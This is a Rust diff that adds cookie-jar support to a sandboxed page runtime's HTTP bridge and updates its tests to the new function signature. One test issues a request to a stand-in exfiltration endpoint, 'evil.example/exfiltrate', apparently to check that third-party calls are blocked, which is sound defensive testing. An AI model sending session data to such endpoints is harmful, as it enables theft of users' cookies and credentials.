@@ -191,6 +191,7 @@ pub fn collect_script_refs(html: &str, base: &url::Url) -> (Vec<Script>, Vec<(us
 /// page sees a normal network failure and conduit records why.
 fn http_request(
     page_origin: &str,
+    jar: Option<&crate::cookies::SharedJar>,
     method: &str,
     url: &str,
     headers_json: &str,
@@ -219,6 +220,12 @@ fn http_request(
         }
     }
 
+    // The page's own XHR and fetch are where a signed-in app actually talks to
+    // its API, so they carry the session's cookies like any other request.
+    if let Some(header) = jar.and_then(|j| j.lock().ok()?.header_for(&parsed)) {
+        req = req.set("Cookie", &header);
+    }
+
     let sent = if body.is_empty() {
         req.call()
     } else {
@@ -241,6 +248,15 @@ fn http_request(
         Err(ureq::Error::Status(_, r)) => r,
         Err(e) => return fail(format!("{e}")),
     };
+
+    if let Some(jar) = jar {
+        if let Ok(mut jar) = jar.lock() {
+            let target = url::Url::parse(resp.get_url()).unwrap_or_else(|_| parsed.clone());
+            for value in resp.all("set-cookie") {
+                jar.store(&target, value);
+            }
+        }
+    }
 
     let status = resp.status();
     let status_text = resp.status_text().to_string();
@@ -502,6 +518,7 @@ impl Page {
         scripts: Vec<Script>,
         modules: HashMap<String, String>,
         session: Option<&str>,
+        jar: Option<crate::cookies::SharedJar>,
     ) -> Result<Self> {
         let rt = Runtime::new().context("creating QuickJS runtime")?;
         // Page scripts are untrusted. Cap memory and stack so a hostile or
@@ -602,10 +619,11 @@ impl Page {
             // interleave with, and a blocking call keeps the whole engine
             // single-threaded and free of a second async runtime.
             let page_origin = origin.clone();
+            let page_jar = jar.clone();
             let http = Function::new(
                 ctx.clone(),
                 move |method: String, url: String, headers_json: String, body: String| -> String {
-                    http_request(&page_origin, &method, &url, &headers_json, &body)
+                    http_request(&page_origin, page_jar.as_ref(), &method, &url, &headers_json, &body)
                 },
             )?;
             ctx.globals().set("__conduit_http", http)?;
@@ -1040,7 +1058,7 @@ mod tests {
             external.is_empty(),
             "fixture should have no external scripts"
         );
-        Page::load(TODO, &url, &url, scripts, HashMap::new(), None).expect("page should load")
+        Page::load(TODO, &url, &url, scripts, HashMap::new(), None, None).expect("page should load")
     }
 
     fn load_module_fixture() -> Page {
@@ -1051,7 +1069,7 @@ mod tests {
             scripts.iter().any(|s| s.is_module),
             "fixture must use a module"
         );
-        Page::load(MODULE_TODO, &url, &url, scripts, HashMap::new(), None).expect("page should load")
+        Page::load(MODULE_TODO, &url, &url, scripts, HashMap::new(), None, None).expect("page should load")
     }
 
     #[test]
@@ -1186,7 +1204,7 @@ mod tests {
             import "./never-fetched.js";
         </script></body></html>"#;
         let (scripts, _) = collect_script_refs(html, &url);
-        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert!(
             page.diagnostics
                 .unresolved_modules
@@ -1316,6 +1334,7 @@ mod tests {
         // party is not.
         let out = http_request(
             "https://app.example",
+            None,
             "GET",
             "https://evil.example/exfiltrate",
             "{}",
@@ -1347,7 +1366,7 @@ mod tests {
         let url = url::Url::parse("https://plain.example/").unwrap();
         let html = "<html><body><script>var x = 1;</script></body></html>";
         let (scripts, _) = collect_script_refs(html, &url);
-        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert_eq!(page.diagnostics.model_context_lookups, 0);
         assert_eq!(page.diagnostics.register_calls, 0);
         assert_eq!(page.diagnostics.scripts_failed, 0);
@@ -1364,7 +1383,7 @@ mod tests {
             document.modelContext.getTools().then(function(){});
         </script></body></html>"#;
         let (scripts, _) = collect_script_refs(html, &url);
-        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert_eq!(page.diagnostics.register_calls, 0);
         assert!(
             page.diagnostics.consume_calls > 0,
@@ -1444,7 +1463,7 @@ mod tests {
 
         let (scripts, _) = collect_script_refs(WRITES, &url);
         let mut writer =
-            Page::load(WRITES, &url, &url, scripts, HashMap::new(), None).expect("writer loads");
+            Page::load(WRITES, &url, &url, scripts, HashMap::new(), None, None).expect("writer loads");
         let snapshot = writer.export_session().expect("snapshot succeeds");
         assert!(
             snapshot.contains("hello") && snapshot.contains("world"),
@@ -1461,6 +1480,7 @@ mod tests {
             scripts,
             HashMap::new(),
             Some(snapshot.as_str()),
+            None,
         )
         .expect("restored page loads");
 
@@ -1473,7 +1493,7 @@ mod tests {
         // sessions are not actually isolated.
         let (scripts, _) = collect_script_refs(READS, &url);
         let empty =
-            Page::load(READS, &url, &url, scripts, HashMap::new(), None).expect("empty page loads");
+            Page::load(READS, &url, &url, scripts, HashMap::new(), None, None).expect("empty page loads");
         let seen = empty.eval_debug("window.__seen").unwrap();
         assert!(seen.contains("\"texts\":[]"), "a sessionless page saw data: {seen}");
     }
@@ -1562,7 +1582,7 @@ mod tests {
         assert_eq!(external.len(), 1, "fixture loads one external bundle");
         scripts[external[0].0].source = bundle.to_string();
 
-        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert!(
             page.diagnostics.script_errors.is_empty(),
             "unexpected errors: {:?}",
@@ -1604,7 +1624,7 @@ mod tests {
         assert_eq!(external.len(), 1, "fixture loads one module bundle");
         scripts[external[0].0].source = bundle.to_string();
 
-        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None).unwrap();
+        let page = Page::load(html, &url, &url, scripts, HashMap::new(), None, None).unwrap();
         assert!(
             page.diagnostics.script_errors.is_empty(),
             "unexpected errors: {:?}",
